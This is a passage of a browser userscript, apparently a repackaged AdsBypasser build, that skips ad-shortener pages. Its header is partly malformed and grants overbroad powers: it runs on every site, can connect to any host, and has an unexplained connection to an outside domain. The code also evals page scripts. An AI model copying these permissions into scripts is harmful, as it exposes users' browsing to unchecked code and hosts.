// ==UserScript==
// @name        doOBlOob
// @version     dob5
// @author      dob5
// @license     dob5
// @copyright   dob5
// @match       *://*/*
// @match       *.*,//#/
// @include     *://*/*
// @include     *.*,//#/
// @require     *
// @grant       js.i--TODO==usr":('IN-mailbox.'//'/io-get.g-i/*''//#'/''):"*,*"
// @connect     *
// @connect     https://cdnjs.cloudflare.com
// @connect     https://cdn.jsdelivr.net
// @grant          unsafeWindow
// @grant          GM_xmlhttpRequest
// @grant          GM_addStyle
// @grant          GM_getResourceText
// @grant          GM_getResourceURL
// @grant          GM_getValue
// @grant          GM_openInTab
// @grant          GM_registerMenuCommand
// @grant          GM_setValue
// @run-at         document-start
// @include        http://*
// @include        https://*
// @connect      engageub.pythonanywhere.com
// @require      http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js
// ==/UserScript==
(function (context, factory) {
  if (typeof module === 'object' && typeof module.exports === 'object') {
    module.exports = factory(context, Promise);
  } else {
    var P = null;
    if (context.unsafeWindow.Future) {
      P = function (fn) {
        return context.unsafeWindow.Future.call(this, function (fr) {
          fn(fr.resolve.bind(fr), fr.reject.bind(fr));
        });
      };
    } else if (context.PromiseResolver) {
      P = function (fn) {
        return new context.Promise(function (pr) {
          fn(pr.resolve.bind(pr), pr.reject.bind(pr));
        });
      };
    } else if (typeof context.Promise === 'function') {
      P = context.Promise;
    } else {
      P = this.Promise;
    }
    factory(context, P);
  }
}(this, function (context, Promise) {
  'use strict';
  var _ = context._ = {};
  function setupStack () {
    if (Error.captureStackTrace) {
      Error.captureStackTrace(this, this.constructor);
    } else if (!this.hasOwnProperty('stack')) {
      var stack = (new Error()).stack.split('\n').slice(2);
      var e = stack[0].match(/^.*@(.*):(\d*)$/);
      this.fileName = e[1];
      this.lineNumber = parseInt(e[2], 10);
      this.stack = stack.join('\n');
    }
  }
  function AdsBypasserError (message) {
    setupStack.call(this);
    this.message = message;
  }
  AdsBypasserError.prototype = Object.create(Error.prototype);
  AdsBypasserError.prototype.constructor = AdsBypasserError;
  AdsBypasserError.prototype.name = 'AdsBypasserError';
  AdsBypasserError.extend = function (protoProps, staticProps) {
    var parent = this, child = function () {
      setupStack.call(this);
      protoProps.constructor.apply(this, arguments);
    };
    extend(child, parent, staticProps);
    child.prototype = Object.create(parent.prototype);
    extend(child.prototype, protoProps);
    child.prototype.constructor = child;
    child.super = parent.prototype;
    return child;
  };
  AdsBypasserError.super = null;
  _.AdsBypasserError = AdsBypasserError;
  function any (c, fn) {
    if (c.some) {
      return c.some(fn);
    }
    if (typeof c.length === 'number') {
      return Array.prototype.some.call(c, fn);
    }
    return Object.keys(c).some(function (k) {
      return fn(c[k], k, c);
    });
  }
  function all (c, fn) {
    if (c.every) {
      return c.every(fn);
    }
    if (typeof c.length === 'number') {
      return Array.prototype.every.call(c, fn);
    }
    return Object.keys(c).every(function (k) {
      return fn(c[k], k, c);
    });
  }
  function each (c, fn) {
    if (c.forEach) {
      c.forEach(fn);
    } else if (typeof c.length === 'number') {
      Array.prototype.forEach.call(c, fn);
    } else {
      Object.keys(c).forEach(function (k) {
        fn(c[k], k, c);
      });
    }
  }
  function map (c, fn) {
    if (c.map) {
      return c.map(fn);
    }
    if (typeof c.length === 'number') {
      return Array.prototype.map.call(c, fn);
    }
    return Object.keys(c).map(function (k) {
      return fn(c[k], k, c);
    });
  }
  function extend(c) {
    Array.prototype.slice.call(arguments, 1).forEach(function (source) {
      if (!source) {
        return;
      }
      _.C(source).each(function (v, k) {
        c[k] = v;
      });
    });
    return c;
  }
  function CollectionProxy (collection) {
    this._c = collection;
  }
  CollectionProxy.prototype.size = function () {
    if (typeof this._c.length === 'number') {
      return this._c.length;
    }
    return Object.keys(c).length;
  };
  CollectionProxy.prototype.at = function (k) {
    return this._c[k];
  };
  CollectionProxy.prototype.each = function (fn) {
    each(this._c, fn);
    return this;
  };
  CollectionProxy.prototype.find = function (fn) {
    var result;
    any(this._c, function (value, index, self) {
      var tmp = fn(value, index, self);
      if (tmp !== _.none) {
        result = {
          key: index,
          value: value,
          payload: tmp,
        };
        return true;
      }
      return false;
    });
    return result;
  };
  CollectionProxy.prototype.all = function (fn) {
    return all(this._c, fn);
  };
  CollectionProxy.prototype.map = function (fn) {
    return map(this._c, fn);
  };
  _.C = function (collection) {
    return new CollectionProxy(collection);
  };
  _.T = function (s) {
    if (typeof s === 'string') {
    } else if (s instanceof String) {
      s = s.toString();
    } else {
      throw new AdsBypasserError('template must be a string');
    }
    var T = {
      '{{': '{',
      '}}': '}',
    };
    return function () {
      var args = Array.prototype.slice.call(arguments);
      var kwargs = args[args.length-1];
      return s.replace(/\{\{|\}\}|\{([^\}]+)\}/g, function (m, key) {
        if (T.hasOwnProperty(m)) {
          return T[m];
        }
        if (args.hasOwnProperty(key)) {
          return args[key];
        }
        if (kwargs.hasOwnProperty(key)) {
          return kwargs[key];
        }
        return m;
      });
    };
  };
  _.P = function (fn) {
    if (typeof fn !== 'function') {
      throw new _.AdsBypasserError('must give a function');
    }
    var slice = Array.prototype.slice;
    var args = slice.call(arguments, 1);
    return function () {
      return fn.apply(this, args.concat(slice.call(arguments)));
    };
  };
  _.D = function (fn) {
    return new Promise(fn);
  };
  _.parseJSON = function (json) {
    try {
      return JSON.parse(json);
    } catch (e) {
      _.warn(e, json);
    }
    return _.none;
  };
  _.isString = function (value) {
    return (typeof value === 'string') || (value instanceof String);
  };
  _.nop = function () {
  };
  _.none = _.nop;
  _.wait = function (msDelay) {
    return _.D(function (resolve, reject) {
      setTimeout(resolve, msDelay);
    });
  };
  _.try = function (msInterval, fn) {
    return _.D(function (resolve, reject) {
      var handle = setInterval(function () {
        var result = fn();
        if (result !== _.none) {
          clearInterval(handle);
          resolve(result);
        }
      }, msInterval);
    });
  };
  function log (method, args) {
    if (_._quiet) {
      return;
    }
    args = Array.prototype.slice.call(args);
    if (_.isString(args[0])) {
      args[0] = 'AdsBypasser: ' + args[0];
    } else {
      args.unshift('AdsBypasser:');
    }
    var f = console[method];
    if (typeof f === 'function') {
      f.apply(console, args);
    }
  }
  _._quiet = false;
  _.info = function () {
    log('info', arguments);
  };
  _.warn = function () {
    log('warn', arguments);
  };
  return _;
}));
(function (context, factory) {
  if (typeof module === 'object' && typeof module.exports === 'object') {
    module.exports = function (context) {
      var core = require('./core.js');
      return factory(context, core);
    };
  } else {
    context.$ = factory(context, context._);
  }
}(this, function (context, _) {
  'use strict';
  var window = context.window;
  var document = window.document;
  var DomNotFoundError = _.AdsBypasserError.extend({
    name: 'DomNotFoundError',
    constructor: function (selector) {
      DomNotFoundError.super.constructor.call(this, _.T('`{0}` not found')(selector));
    },
  });
  var $ = function (selector, context) {
    if (!context || !context.querySelector) {
      context = document;
    }
    var n = context.querySelector(selector);
    if (!n) {
      throw new DomNotFoundError(selector);
    }
    return n;
  };
  $.$ = function (selector, context) {
    try {
      return $(selector, context);
    } catch (e) {
      return null;
    }
  };
  $.$$ = function (selector, context) {
    if (!context || !context.querySelectorAll) {
      context = document;
    }
    var ns = context.querySelectorAll(selector);
    return _.C(ns);
  };
  $.toDOM = function(rawHTML) {
    try {
      var parser = new DOMParser();
      var DOMHTML = parser.parseFromString(rawHTML, "text/html");
      return DOMHTML;
    } catch (e) {
      throw new _.AdsBypasserError('could not parse HTML to DOM');
    }
  };
  $.removeNodes = function (selector, context) {
    $.$$(selector, context).each(function (e) {
      e.parentNode.removeChild(e);
    });
  };
  function searchScriptsByRegExp (pattern, context) {
    var m = $.$$('script', context).find(function (s) {
      var m = s.innerHTML.match(pattern);
      if (!m) {
        return _.none;
      }
      return m;
    });
    if (!m) {
      return null;
    }
    return m.payload;
  }
  function searchScriptsByString (pattern, context) {
    var m = $.$$('script', context).find(function (s) {
      var m = s.innerHTML.indexOf(pattern);
      if (m < 0) {
        return _.none;
      }
      return m;
    });
    if (!m) {
      return null;
    }
    return m.value.innerHTML;
  }
  $.searchScripts = function (pattern, context) {
    if (pattern instanceof RegExp) {
      return searchScriptsByRegExp(pattern, context);
    } else if (_.isString(pattern)) {
      return searchScriptsByString(pattern, context);
    } else {
      return null;
    }
  };
  return $;
}));
(function (context, factory) {
  if (typeof module === 'object' && typeof module.exports === 'object') {
    module.exports = function (context, GM) {
      var core = require('./core.js');
      return factory(context, GM, core);
    };
  } else {
    factory(context, {
      xmlhttpRequest: GM_xmlhttpRequest,
    }, context._);
  }
}(this, function (context, GM, _) {
  'use strict';
  var window = context.window;
  var document = window.document;
  var $ = context.$ || {};
  function deepJoin (prefix, object) {
    return _.C(object).map(function (v, k) {
      var key = _.T('{0}[{1}]')(prefix, k);
      if (typeof v === 'object') {
        return deepJoin(key, v);
      }
      return _.T('{0}={1}').apply(this, [key, v].map(encodeURIComponent));
    }).join('&');
  }
  function toQuery (data) {
    var type = typeof data;
    if (data === null || (type !== 'string' && type !== 'object')) {
      return '';
    }
    if (type === 'string') {
      return data;
    }
    if (data instanceof String) {
      return data.toString();
    }
    return _.C(data).map(function (v, k) {
      if (typeof v === 'object') {
        return deepJoin(k, v);
      }
      return _.T('{0}={1}').apply(this, [k, v].map(encodeURIComponent));
    }).join('&');
  }
  function ajax (method, url, data, headers) {
    var l = document.createElement('a');
    l.href = url;
    var reqHost = l.hostname;
    var overrideHeaders = {
      Host: reqHost || window.location.host,
      Origin: window.location.origin,
      Referer: window.location.href,
      'X-Requested-With': 'XMLHttpRequest',
    };
    _.C(overrideHeaders).each(function (v, k, c) {
      if (headers[k] === _.none) {
        delete headers[k];
      } else {
        headers[k] = v;
      }
    });
    if (data) {
      if (headers['Content-Type'].indexOf('json') >= 0) {
        data = JSON.stringify(data);
      } else {
        data = toQuery(data);
      }
      headers['Content-Length'] = data.length;
    }
    var xhr = null;
    var promise = _.D(function (resolve, reject) {
      xhr = GM.xmlhttpRequest({
        method: method,
        url: url,
        data: data,
        headers: headers,
        onload: function (response) {
          response = (typeof response.responseText !== 'undefined') ? response : this;
          if (response.status !== 200) {
            reject(response.responseText);
          } else {
            resolve(response.responseText);
          }
        },
        onerror: function (response) {
          response = (typeof response.responseText !== 'undefined') ? response : this;
          reject(response.responseText);
        },
      });
    });
    promise.abort = function () {
      xhr.abort();
    };
    return promise;
  }
  $.get = function (url, data, headers) {
    data = toQuery(data);
    data = data ? '?' + data : '';
    headers = headers || {};
    return ajax('GET', url + data, '', headers);
  };
  $.post = function (url, data, headers) {
    var h = {
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    };
    if (headers) {
      _.C(headers).each(function (v, k) {
        h[k] = v;
      });
    }
    return ajax('POST', url, data, h);
  };
  return $;
}));
(function (context, factory) {
  if (typeof module === 'object' && typeof module.exports === 'object') {
    module.exports = function (context) {
      var core = require('./core.js');
      return factory(context, core);
    };
  } else {
    factory(context, context._);
  }
}(this, function (context, _) {
  'use strict';
  var window = context.window;
  var document = window.document;
  var $ = context.$ || {};
  $.setCookie = function (key, value) {
    var now = new Date();
    now.setTime(now.getTime() + 3600 * 1000);
    var tpl = _.T('{0}={1};path={2};');
    document.cookie = tpl(key, value, window.location.pathname, now.toUTCString());
  };
  $.getCookie = function (key) {
    var c = _.C(document.cookie.split(';')).find(function (v) {
      var k = v.replace(/^\s*([a-zA-Z0-9-_]+)=.+$/, '$1');
      if (k !== key) {
        return _.none;
      }
    });
    if (!c) {
      return null;
    }
    c = c.value.replace(/^\s*[a-zA-Z0-9-_]+=([^;]+).?$/, '$1');
    if (!c) {
      return null;
    }
    return c;
  };
  $.resetCookies = function () {
    var a = document.domain;
    var b = document.domain.replace(/^www\./, '');
    var c = document.domain.replace(/^(\w+\.)+?(\w+\.\w+)$/, '$2');
    var d = (new Date(1e3)).toUTCString();
    _.C(document.cookie.split(';')).each(function (v) {
      var k = v.replace(/^\s*(\w+)=.+$/, '$1');
      document.cookie = _.T('{0}=;expires={1};')(k, d);
      document.cookie = _.T('{0}=;path=/;expires={1};')(k, d);
      var e = _.T('{0}=;path=/;domain={1};expires={2};');
      document.cookie = e(k, a, d);
      document.cookie = e(k, b, d);
      document.cookie = e(k, c, d);
    });
  };
  return $;
}));
(function (context, factory) {
  if (typeof module === 'object' && typeof module.exports === 'object') {
    module.exports = function (context) {
      var core = require('./core.js');
      return factory(context, core);
    };
  } else {
    factory(context, context._);
  }
}(this, function (context, _) {
  'use strict';
  var window = context.window;
  var document = window.document;
  var $ = context.$ || {};
  var patterns = [];
  $.register = function (pattern) {
    patterns.push(pattern);
  };
  function dispatchByObject (rule, url_6) {
    var matched = {};
    var passed = _.C(rule).all(function (pattern, part) {
      if (pattern instanceof RegExp) {
        matched[part] = url_6[part].match(pattern);
      } else if (pattern instanceof Array) {
        var r = _.C(pattern).find(function (p) {
          var m = url_6[part].match(p);
          return m || _.none;
        });
        matched[part] = r ? r.payload : null;
      }
      return !!matched[part];
    });
    return passed ? matched : null;
  }
  function dispatchByRegExp (rule, url_1) {
    return url_1.match(rule);
  }
  function dispatchByArray (rules, url_1, url_3, url_6) {
    var tmp = _.C(rules).find(function (rule) {
      var m = dispatch(rule, url_1, url_3, url_6);
      if (!m) {
        return _.none;
      }
      return m;
    });
    return tmp ? tmp.payload : null;
  }
  function dispatchByString (rule, url_3) {
    var scheme = /\*|https?|file|ftp|chrome-extension/;
    var host = /\*|(\*\.)?([^\/*]+)/;
    var path = /\/.*/;
    var up = new RegExp(_.T('^({scheme})://({host})?({path})$')({
      scheme: scheme.source,
      host: host.source,
      path: path.source,
    }));
    var matched = rule.match(up);
    if (!matched) {
      return null;
    }
    scheme = matched[1];
    host = matched[2];
    var wc = matched[3];
    var sd = matched[4];
    path = matched[5];
    if (scheme === '*' && !/https?/.test(url_3.scheme)) {
      return null;
    } else if (scheme !== url_3.scheme) {
      return null;
    }
    if (scheme !== 'file' && host !== '*') {
      if (wc) {
        up = url_3.host.indexOf(sd);
        if (up < 0 || up + sd.length !== url_3.host.length) {
          return null;
        }
      } else if (host !== url_3.host) {
        return null;
      }
    }
    path = new RegExp(_.T('^{0}$')(path.replace(/[*.\[\]?+#]/g, function (c) {
      if (c === '*') {
        return '.*';
      }
      return '\\' + c;
    })));
    if (!path.test(url_3.path)) {
      return null;
    }
    return url_3;
  }
  function dispatchByFunction (rule, url_1, url_3, url_6) {
    return rule(url_1, url_3, url_6);
  }
  function dispatch (rule, url_1, url_3, url_6) {
    if (rule instanceof Array) {
      return dispatchByArray(rule, url_1, url_3, url_6);
    }
    if (typeof rule === 'function') {
      return dispatchByFunction(rule, url_1, url_3, url_6);
    }
    if (rule instanceof RegExp) {
      return dispatchByRegExp(rule, url_1);
    }
    if (_.isString(rule)) {
      return dispatchByString(rule, url_3);
    }
    return dispatchByObject(rule, url_6);
  }
  $._findHandler = function () {
    var url_1 = window.location.toString();
    var url_3 = {
      scheme: window.location.protocol.slice(0, -1),
      host: window.location.host,
      path: window.location.pathname + window.location.search + window.location.hash,
    };
    var url_6 = {
      scheme: window.location.protocol,
      host: window.location.hostname,
      port: window.location.port,
      path: window.location.pathname,
      query: window.location.search,
      hash: window.location.hash,
    };
    var pattern = _.C(patterns).find(function (pattern) {
      var m = dispatch(pattern.rule, url_1, url_3, url_6);
      if (!m) {
        return _.none;
      }
      return m;
    });
    if (!pattern) {
      return null;
    }
    var matched = pattern.payload;
    pattern = pattern.value;
    if (!pattern.start && !pattern.ready) {
      return null;
    }
    return {
      start: pattern.start ? _.P(pattern.start, matched) : _.nop,
      ready: pattern.ready ? _.P(pattern.ready, matched) : _.nop,
    };
  };
  return $;
}));
(function (context, factory) {
  if (typeof module === 'object' && typeof module.exports === 'object') {
    module.exports = function (context) {
      var core = require('./core.js');
      return factory(context, core);
    };
  } else {
    factory(context, context._);
  }
}(this, function (context, _) {
  'use strict';
  var window = context.window;
  var document = window.document;
  var $ = context.$ || {};
  function prepare (e) {
    if (!document.body) {
      document.body = document.createElement('body');
    }
    document.body.appendChild(e);
    return _.wait(0);
  }
  function get (url) {
    var a = document.createElement('a');
    a.href = url;
    var clicked = false;
    a.addEventListener('click', function (event) {
      event.stopPropagation();
      clicked = true;
    });
    prepare(a).then(() => {
      a.click();
      var tick = setInterval(function () {
        if (clicked) {
          _.info('already clicked');
          clearInterval(tick);
          return;
        }
        _.info('try again');
        a.click();
      }, 50);
    });
  }
  function post (path, params) {
    params = params || {};
    var form = document.createElement('form');
    form.method = 'post';
    form.action = path;
    _.C(params).each(function (value, key) {
        var input = document.createElement('input');
        input.type = 'hidden';
        input.name = key;
        input.value = value;
        form.appendChild(input);
    });
    prepare(form);
    form.submit();
  }
  $.openLink = function (to, options) {
    if (!_.isString(to) && !to) {
      _.warn('false URL');
      return;
    }
    options = options || {};
    var withReferer = typeof options.referer === 'undefined' ? true : options.referer;
    var postData = options.post;
    var from = window.location.toString();
    _.info(_.T('{0} -> {1}')(from, to));
    if (postData) {
      post(to, postData);
      return;
    }
    if (withReferer) {
      get(to);
      return;
    }
    window.top.location.replace(to);
  };
  return $;
}));
(function (context, factory) {
  if (typeof module === 'object' && typeof module.exports === 'object') {
    module.exports = function (context) {
      var core = require('./core.js');
      var ajax = require('./ajax.js');
      var $ = ajax(context);
      return factory(context, core, $);
    };
  } else {
    factory(context, context._, context.$);
  }
}(this, function (context, _, $) {
  'use strict';
  var window = context.window;
  var unsafeWindow = context.unsafeWindow || (0, eval)('this').window;
  var document = window.document;
  $.removeAllTimer = function () {
    var handle = window.setInterval(_.nop, 10);
    while (handle > 0) {
      window.clearInterval(handle--);
    }
    handle = window.setTimeout(_.nop, 10);
    while (handle > 0) {
      window.clearTimeout(handle--);
    }
  };
  $.nuke = function (url) {
    try {
      $.window.document.write('nuked by AdsBypasser, leading to ...<br/>');
    } catch (e) {
      _.warn('nuke failed', e);
    }
    var a = document.createElement('a');
    a.href = url;
    a.textContent = url;
    document.body.appendChild(a);
  };
  $.generateRandomIP = function () {
    return [0,0,0,0].map(function () {
      return Math.floor(Math.random() * 256);
    }).join('.');
  };
  $.captcha = function (imgSrc, cb) {
    if (!$.config.externalServerSupport) {
      return;
    }
    var a = document.createElement('canvas');
    var b = a.getContext('2d');
    var c = new Image();
    c.src = imgSrc;
    c.onload = function () {
      a.width = c.width;
      a.height = c.height;
      b.drawImage(c, 0, 0);
      var d = a.toDataURL();
      var e = d.substr(d.indexOf(',') + 1);
      $.post('http://www.wcpan.info/cgi-bin/captcha.cgi', {
        i: e,
      }, cb);
    };
  };
  function clone (safe) {
    if (safe === null || !(safe instanceof Object)) {
      return safe;
    }
    if (safe === unsafeWindow) {
      return safe;
    }
    if (safe instanceof String) {
      return safe.toString();
    }
    if (safe instanceof Function) {
      return exportFunction(safe, unsafeWindow, {
        allowCrossOriginArguments: true,
      });
    }
    if (safe instanceof Array) {
      var unsafe = new unsafeWindow.Array();
      for (var i = 0; i < safe.length; ++i) {
        unsafe.push(clone(safe[i]));
      }
      return unsafe;
    }
    var unsafe = new unsafeWindow.Object();
    _.C(safe).each(function (v, k) {
      unsafe[k] = clone(v);
    });
    return unsafe;
  }
  var MAGIC_KEY = '__adsbypasser_reverse_proxy__';
  $.window = (function () {
    var isFirefox = typeof InstallTrigger !== 'undefined';
    if (!isFirefox) {
      return unsafeWindow;
    }
    var decorator = {
      set: function (target, key, value) {
        if (key === MAGIC_KEY) {
          return false;
        }
        if (target === unsafeWindow && key === 'open') {
          var d = Object.getOwnPropertyDescriptor(target, key);
          d.value = clone(function () {
            var rv = value();
            return cloneInto(rv, unsafeWindow);
          });
          Object.defineProperty(target, key, d);
        } else {
          target[key] = clone(value);
        }
        return true;
      },
      get: function (target, key) {
        if (key === MAGIC_KEY) {
          return target;
        }
        var value = target[key];
        var type = typeof value;
        if (value === null || (type !== 'function' && type !== 'object')) {
          return value;
        }
        return new Proxy(value, decorator);
      },
      apply: function (target, self, args) {
        args = Array.prototype.slice.call(args);
        if (target === unsafeWindow.Object.defineProperty) {
          args[0] = args[0][MAGIC_KEY];
        }
        if (target === unsafeWindow.Function.apply) {
          self = self[MAGIC_KEY];
          args[1] = Array.prototype.slice.call(args[1]);
        }
        if (target === unsafeWindow.document.querySelector) {
          self = self[MAGIC_KEY];
        }
        if (target === unsafeWindow.document.write) {
          self = self[MAGIC_KEY];
        }
        var usargs = clone(args);
        return target.apply(self, usargs);
      },
      construct: function (target, args) {
        args = Array.prototype.slice.call(args);
        args.unshift(undefined);
        var usargs = clone(args);
        var bind = unsafeWindow.Function.prototype.bind;
        return new (bind.apply(target, usargs));
      },
    };
    return new Proxy(unsafeWindow, decorator);
  })();
  return $;
}));
(function (context, factory) {
  if (typeof module === 'object' && typeof module.exports === 'object') {
    module.exports = function (context, GM) {
      var _ = require('lodash');
      var core = require('./core.js');
      var misc = require('./misc.js');
      var dispatcher = require('./dispatcher.js');
      var modules = [misc, dispatcher].map(function (v) {
        return v.call(null, context, GM);
      });
      var $ = _.assign.apply(null, modules);
      return factory(context, GM, core, $);
    };
  } else {
    factory(context, {
      getValue: GM_getValue,
      setValue: GM_setValue,
    }, context._, context.$);
  }
}(this, function (context, GM, _, $) {
  'use strict';
  var MANIFEST = [
    {
      name: 'version',
      key: 'version',
      default_: 0,
      verify: function (v) {
        return typeof v === 'number' && v >= 0;
      },
      normalize: toNumber,
    },
    {
      name: 'alignCenter',
      key: 'align_center',
      default_: true,
      verify: isBoolean,
      normalize: toBoolean,
    },
    {
      name: 'changeBackground',
      key: 'change_background',
      default_: true,
      verify: isBoolean,
      normalize: toBoolean,
    },
    {
      name: 'externalServerSupport',
      key: 'external_server_support',
      default_: false,
      verify: isBoolean,
      normalize: toBoolean,
    },
    {
      name: 'redirectImage',
      key: 'redirect_image',
      default_: true,
      verify: isBoolean,
      normalize: toBoolean,
    },
    {
      name: 'scaleImage',
      key: 'scale_image',
      default_: true,
      verify: isBoolean,
      normalize: toBoolean,
    },
    {
      name: 'logLevel',
      key: 'log_level',
      default_: 1,
      verify: function (v) {
        return typeof v === 'number' && v >= 0 && v <= 2;
      },
      normalize: toNumber,
    },
  ];
  var PATCHES = [
    function (c) {
      var ac = typeof c.alignCenter === 'boolean';
      if (typeof c.changeBackground !== 'boolean') {
        c.changeBackground = ac ? c.alignCenter : true;
      }
      if (typeof c.scaleImage !== 'boolean') {
        c.scaleImage = ac ? c.alignCenter : true;
      }
      if (!ac) {
        c.alignCenter = true;
      }
      if (typeof c.redirectImage !== 'boolean') {
        c.redirectImage = true;
      }
    },
    function (c) {
      if (typeof c.externalServerSupport !== 'boolean') {
        c.externalServerSupport = false;
      }
    },
    function (c) {
      if (typeof c.logLevel !== 'number') {
        c.logLevel = 1;
      }
    },
  ];
  var window = context.window;
  function isBoolean (v) {
    return typeof v === 'boolean';
  }
  function toBoolean (v) {
    return !!v;
  }
  function toNumber (v) {
    return parseInt(v, 10);
  }
  function createConfig () {
    var c = {};
    _.C(MANIFEST).each(function (m) {
      Object.defineProperty(c, m.name, {
        configurable: true,
        enumerable: true,
        get: function () {
          return GM.getValue(m.key, m.default_);
        },
        set: function (v) {
          GM.setValue(m.key, v);
          var nv = GM.getValue(m.key, m.default_);
          if (nv !== v) {
            var s = _.T('failed to write config, key: {0}, value: {1}, new: {2}');
            throw new _.AdsBypasserError(s(s.key, nv, v));
          }
        },
      });
    });
    return c;
  }
  function senityCheck (c) {
    var ok = _.C(MANIFEST).all(function (m) {
      return m.verify(c[m.name]);
    });
    if (!ok) {
      c.version = 0;
    }
    return c;
  }
  function migrate (c) {
    if (typeof c.version !== 'number' || c.version < 0) {
      throw new _.AdsBypasserError('wrong config version: ' + c.version);
    }
    while (c.version < PATCHES.length) {
      PATCHES[c.version](c);
      ++c.version;
    }
    return c;
  }
  $.config = migrate(senityCheck(createConfig()));
  $.register({
    rule: {
      host: /^adsbypasser\.github\.io$/,
      path: /^\/configure\.html$/,
    },
    ready: function () {
      $.window.commit = function (data) {
        data.version = $.config.version;
        _.C(data).each(function (v, k) {
          $.config[k] = v;
        });
      };
      $.window.render({
        version: $.config.version,
        options: {
          alignCenter: {
            type: 'checkbox',
            value: $.config.alignCenter,
            label: 'Align Center',
            help: 'Align image to the center if possible. (default: enabled)',
          },
          changeBackground: {
            type: 'checkbox',
            value: $.config.changeBackground,
            label: 'Change Background',
            help: 'Use Firefox-like image background if possible. (default: enabled)',
          },
          redirectImage: {
            type: 'checkbox',
            value: $.config.redirectImage,
            label: 'Redirect Image',
            help: [
              'Directly open image link if possible. (default: enabled)',
              'If disabled, redirection will only works on link shortener sites.',
            ].join('<br/>\n'),
          },
          scaleImage: {
            type: 'checkbox',
            value: $.config.scaleImage,
            label: 'Scale Image',
            help: 'When image loaded, scale it to fit window if possible. (default: enabled)',
          },
          externalServerSupport: {
            type: 'checkbox',
            value: $.config.externalServerSupport,
            label: 'External Server Support',
            help: [
              'Send URL information to external server to enhance features (e.g.: captcha resolving). (default: disabled)',
              'Affected sites:',
              'setlinks.us (captcha)',
            ].join('<br/>\n'),
          },
          logLevel: {
            type: 'select',
            value: $.config.logLevel,
            menu: [
              [0, '0 (quiet)'],
              [1, '1 (default)'],
              [2, '2 (verbose)'],
            ],
            label: 'Log Level',
            help: [
              'Log level in developer console. (default: 1)',
              '0 will not print anything in console.',
              '1 will only print logs on affected sites.',
              '2 will print on any sites.',
            ].join('<br/>\n'),
          },
        },
      });
    },
  });
  return $;
}));
$.register({
  rule: {
    host: /^01\.nl$/,
  },
  ready: function () {
    'use strict';
    var f = $('iframe#redirectframe');
    $.openLink(f.src);
  },
});
$.register({
  rule: {
    host: /^10co\.(biz|xyz|co|me)$/,
  },
  ready: function () {
    'use strict';
    var d = $('.go');
    $.openLink(d.dataset.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?1be\.biz$/,
    path: /^\/s\.php$/,
    query: /^\?(.+)/,
  },
  start: function (m) {
    'use strict';
    $.openLink(m.query[1]);
  },
});
$.register({
  rule: {
    host: /^(www\.)?1tiny\.net$/,
    path: /\/\w+/
  },
  ready: function () {
    'use strict';
    var directUrl = $.searchScripts(/window\.location='([^']+)';/);
    if (!directUrl) {
      throw new _.AdsBypasserError('script content changed');
    }
    $.openLink(directUrl[1]);
  },
});
$.register({
  rule: {
    host: /^2ty\.cc$/,
    path: /^\/.+/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var a = $('#close');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?3ra\.be$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var f = $.window.fc;
    if (!f) {
      throw new _.AdsBypasserError('window.fc is undefined');
    }
    f = f.toString();
    f = f.match(/href="([^"]*)/);
    if (!f) {
      throw new _.AdsBypasserError('url pattern outdated');
    }
    $.openLink(f[1]);
  },
});
$.register({
  rule: {
    host: /^(www\.)?4fun\.tw$/,
  },
  ready: function () {
    'use strict';
    var i = $('#original_url');
    $.openLink(i.value);
  },
});
$.register({
  rule: {
    host: /^ad2links\.com$/,
    path: /^\/\w-.+$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    $.openLinkByPost(window.location.toString(), {
      post: {
        image: 'Skip Ad.',
      },
    });
  },
});
$.register({
  rule: {
    host: /^ad4\.fr$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var s = $.searchScripts(/"src", "([^"]+)"/);
    if (!s) {
      _.warn('changed');
      return;
    }
    $.openLink(s[1]);
  },
});
(function () {
  'use strict';
  $.register({
    rule: {
      host: /^ad7\.biz$/,
      path: /^\/\d+\/(.*)$/,
    },
    start: function (m) {
      $.removeNodes('iframe');
      var redirectLink = m.path[1];
      if (!redirectLink.match(/^https?:\/\//)) {
        redirectLink = "http://" + redirectLink;
      }
      $.openLink(redirectLink);
    },
  });
  $.register({
    rule: {
      host: /^ad7\.biz$/,
      path: /^\/\w+$/,
    },
    ready: function () {
      $.removeNodes('iframe');
      var script = $.searchScripts('var r_url');
      var url = script.match(/&url=([^&]+)/);
      url = url[1];
      $.openLink(url);
    },
  });
})();
(function () {
  'use strict';
  $.register({
    rule: {
      host: [
        /^(www\.)?adb\.ug$/,
        /^(www\.)?lynk\.my$/,
        /^adyou\.me$/,
      ],
      path: /^(?!\/(?:privacy|terms|contact(\/.*)?|#.*)?$).*$/
    },
    ready: function () {
      'use strict';
      $.removeNodes('iframe');
      var m = $.searchScripts(/top\.location\.href="([^"]+)"/);
      if (m) {
        $.openLink(m[1]);
        return;
      }
      getArguments().then(function (args) {
        tryLink(args);
      });
    },
  });
  function getArguments () {
    var PATTERN = /\{\s*_args[^}]+\}[^}]+\}/;
    return _.D(function (resolve, reject) {
      var m = $.searchScripts(PATTERN);
      if (m) {
        resolve(m);
        return;
      }
      var observer = new MutationObserver(function (mutations) {
        mutations.forEach(function (mutation) {
          mutation.addedNodes.forEach(function (node) {
            if (node.localName === 'script') {
              var m = node.textContent.match(PATTERN);
              if (m) {
                resolve(m);
                observer.disconnect();
              }
            }
          });
        });
      });
      observer.observe(document.body, {
        childList: true,
      });
    }).then(function (m) {
      return eval('(' + m[0] + ')');
    });
  }
  function tryLink (args) {
    var url = window.location.pathname + '/skip_timer';
    var i = setInterval(function () {
      $.post(url, args).then(function (text) {
        var jj = _.parseJSON(text);
        if (!jj.errors && jj.messages) {
          clearInterval(i);
          $.openLink(jj.messages.url);
        }
      });
    }, 1000);
  }
})();
(function () {
  'use strict';
  function getTokenFromRocketScript () {
    var a = $.searchScripts(/var eu = '(?!false)(.*)'/);
    return a ? a[1] : null;
  }
  $.register({
    rule: {
      host: /^adf\.ly$/,
      path: /^\/redirecting\/(.+)$/,
    },
    start: function (m) {
      var url = atob(m.path[1]);
      $.openLink(url);
    },
  });
  $.register({
    rule: {
      path: /\/locked$/,
      query: /url=([^&]+)/,
    },
    start: function (m) {
      $.resetCookies();
      var url = decodeURIComponent(m.query[1]);
